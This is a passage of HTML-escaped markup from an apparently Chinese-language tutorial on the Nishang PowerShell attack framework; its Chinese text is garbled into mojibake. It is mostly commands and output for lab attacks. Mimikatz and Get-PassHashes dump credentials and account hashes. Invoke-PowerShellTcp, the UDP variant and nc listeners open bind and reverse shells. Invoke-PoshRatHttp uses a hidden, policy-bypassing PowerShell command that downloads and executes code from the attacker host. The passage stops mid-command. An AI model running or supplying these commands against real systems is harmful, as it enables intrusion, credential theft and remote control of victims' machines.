&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nishang&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Gather&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-Mimikatz&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;privilege::debug exit&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ComputerName&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;computer1&amp;#34;&lt;/span&gt;    &lt;span class=&#34;c&#34;&gt;#åœ¨è¿œç¨‹çš„å¦ä¸€å°è®¡ç®—æœºä¸Šè¿è¡Œmimikatzå¹¶æ‰§è¡Œprivilege::debug exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;ç¬”è€…åœ¨è¿™é‡Œæµ‹è¯•çš„Windows Server 2019 å·²ç»å¤±è´¥äº†ï¼Œè¦å»https://github.com/gentilkiwi/mimikatz ä¸‹è½½æœ€æ–°çš„ç‰ˆæœ¬æ‰è¡Œï¼ŒNishangçš„mimkatzå·²ç»ä¸èƒ½åœ¨æ‰“è¡¥ä¸çš„ç³»ç»Ÿä¸Šè·å–åˆ°å‡­è¯äº†&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;get-passhashes&#34;&gt;Get-PassHashes&lt;/h3&gt;
&lt;p&gt;è·å–Hashçš„å·¥å…·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mimikatz_trunk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-PassHashes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;500&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;31d6cfe0d16ae931b73c59d7e0c089c0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Guest&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;501&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;31d6cfe0d16ae931b73c59d7e0c089c0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;DefaultAccount&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;503&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;31d6cfe0d16ae931b73c59d7e0c089c0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;get-passhints&#34;&gt;Get-PassHints&lt;/h3&gt;
&lt;p&gt;æ‰§è¡Œ&lt;code&gt;Get-PassHints&lt;/code&gt;è·å–ç”¨æˆ·çš„å¯†ç æç¤ºä¿¡æ¯,æˆ‘è¿™é‡Œå› ä¸ºæ˜¯åŸŸç¯å¢ƒï¼Œä¸€èˆ¬æ˜¯æ²¡æœ‰å¯†ç å¤‡æ³¨çš„ã€‚&lt;/p&gt;
&lt;h2 id=&#34;éšè—é€šä¿¡éš§é“&#34;&gt;éšè—é€šä¿¡éš§é“&lt;/h2&gt;
&lt;h3 id=&#34;åŸºäºtcpåè®®çš„äº¤äº’å¼shell&#34;&gt;åŸºäºTCPåè®®çš„äº¤äº’å¼shell&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Invoke-PowerShellTcp&lt;/code&gt;æ¨¡å—æ˜¯åŸºäºTCPåè®®çš„æ­£åå‘è¿æ¥shellï¼Œå…·ä½“çš„å‚æ•°å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-IPAddress åå‘è¿æ¥æ—¶éœ€è¦è¿æ¥åˆ°çš„IPåœ°å€
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-Port åå‘è¿æ¥æ—¶æ˜¯éœ€è¦è¿æ¥åˆ°çš„ç«¯å£ï¼Œé€‰æ‹©-Bindé€‰é¡¹æ—¶æ˜¯éœ€è¦ç›‘å¬çš„ç«¯å£
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-Reverse åå‘è¿æ¥
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-Bind æ­£å‘è¿æ¥ç”¨åˆ°çš„ç«¯å£ç›‘å¬
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æ­£å‘è¿æ¥&lt;/p&gt;
&lt;p&gt;åœ¨ç›®æ ‡æœºå™¨è¿è¡Œè„šæœ¬ï¼Œæ‰§è¡Œç›‘å¬ç«¯å£ï¼ˆæ”»å‡»æœºç­‰ä¼šè¦è¿æ¥è¯¥ç«¯å£ï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-PowerShellTcp&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Bind&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Port&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;4445&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨kaliä¸Šé¢è¿è¡Œncå·¥å…·è¿›è¡Œè¿æ¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ nc -nv 172.16.0.106 &lt;span class=&#34;m&#34;&gt;4445&lt;/span&gt;                                                                                                         &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;172.16.0.106&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4445&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; open
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Windows PowerShell running as user testuser on DC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;C&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; Microsoft Corporation. All rights reserved.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;est&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;è®°å¾—å…³é—­é˜²ç«å¢™&lt;/p&gt;
&lt;p&gt;-n ç›´æ¥ä½¿ç”¨IPåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨&lt;/p&gt;
&lt;p&gt;-v æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;åå‘è¿æ¥&lt;/p&gt;
&lt;p&gt;åœ¨Kali(172.16.0.107)æ‰§è¡Œç›‘å¬ç«¯å£ï¼š&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lnvp &lt;span class=&#34;m&#34;&gt;4445&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-PowerShellTcp&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Reverse&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-IPAddress&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;107&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Port&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;4445&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å°±èƒ½åœ¨Kaliä¸Šæ”¶åˆ°åå¼¹å›æ¥çš„shellï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ nc -lnvp &lt;span class=&#34;m&#34;&gt;4445&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4445&lt;/span&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;172.16.0.107&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;172.16.0.106&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;59992&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Windows PowerShell running as user testuser on DC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;C&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; Microsoft Corporation. All rights reserved.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;est&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;ishang-master&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;ishang-master&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¹¦ä¸­è¿˜ç§‘æ™®äº†ä¸€ä¸ªå°çŸ¥è¯†ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Kaliå†…ç½‘-ç›®æ ‡æœºå™¨å¤–ç½‘ï¼šè¿™ä¸ªæ—¶å€™å°±ç”¨æ­£å‘è¿æ¥ï¼Œå› ä¸ºå¤–ç½‘æœºå™¨æœ‰ä¸€ä¸ªå…¬ç½‘çš„IPï¼Œå¯ä»¥ncè¿‡å»&lt;/li&gt;
&lt;li&gt;Kaliå¤–ç½‘-ç›®æ ‡æœºå™¨å†…ç½‘ï¼šè¿™ä¸ªè·Ÿä¸Šé¢åè¿‡æ¥ï¼Œç”¨åå‘è¿æ¥ï¼Œå› ä¸ºä½ çš„Kaliä¸Šé¢æœ‰å…¬ç½‘çš„IP&lt;/li&gt;
&lt;li&gt;éƒ½åœ¨å¤–ç½‘ï¼šç”¨å“ªä¸ªéƒ½å¯ä»¥&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;åŸºäºudpåè®®çš„äº¤äº’å¼shell&#34;&gt;åŸºäºUDPåè®®çš„äº¤äº’å¼shell&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Invoke-PowerShellUdp&lt;/code&gt;æ¨¡å—æ˜¯åŸºäºTCPåè®®çš„æ¨¡å—ï¼Œä½¿ç”¨æ–¹æ³•è·Ÿä¸Šé¢å·®ä¸å¤šï¼Œåªæ˜¯&lt;code&gt;nc&lt;/code&gt;éœ€è¦æ”¹å˜ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -nvu 172.16.0.106 &lt;span class=&#34;m&#34;&gt;4445&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;#æ­£å‘&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lup &lt;span class=&#34;m&#34;&gt;4445&lt;/span&gt;                  &lt;span class=&#34;c1&#34;&gt;#åå‘&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;åŸºäºhttpå’Œhttpsåè®®çš„äº¤äº’å¼shell&#34;&gt;åŸºäºHTTPå’ŒHTTPSåè®®çš„äº¤äº’å¼shell&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Invoke-PoshRatHttp&lt;/code&gt;è¿™ä¸ªè„šæœ¬æ˜¯åŸºäºåå‘è¿æ¥çš„ï¼Œæ„æ€å°±æ˜¯è¯´åªèƒ½åœ¨Windowsæ”»å‡»æœºä¸Šé¢æ‰§è¡Œç›‘å¬ï¼Œç„¶ååœ¨Windowsç›®æ ‡æœºå™¨ä¸Šé¢æ‰§è¡Œåå‘è¿æ¥ï¼š&lt;/p&gt;
&lt;p&gt;åœ¨æ”»å‡»æœºä¸Šæ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-PoshRatHttp&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-IPAddress&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;106&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Port&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;4445&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-WindowStyle&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hidden&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ExecutionPolicy&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Bypass&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-nologo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-noprofile&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;IEX &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;DownloadString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://172.16.0.106:4446/connect&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;è®°å¾—ç”¨ç®¡ç†å‘˜çš„æƒé™&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;åœ¨ç›®æ ‡æ‰§è¡Œä¸Šé¢ç»™å‡ºçš„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;New-Object Net.WebClient&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.DownloadString&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://172.16.0.106:4446/connect&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå°±ä¼šåå¼¹ä¸€ä¸ªhttpçš„shellå›æ¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&#34;nb&#34;&gt;Invoke-PoshRatHttp&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-IPAddress&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;106&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Port&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;4446&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Listening&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;106&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;4446&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Run&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;following&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-WindowStyle&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hidden&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ExecutionPolicy&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Bypass&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-nologo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-noprofile&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;IEX &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Downloa&lt;/span&gt;
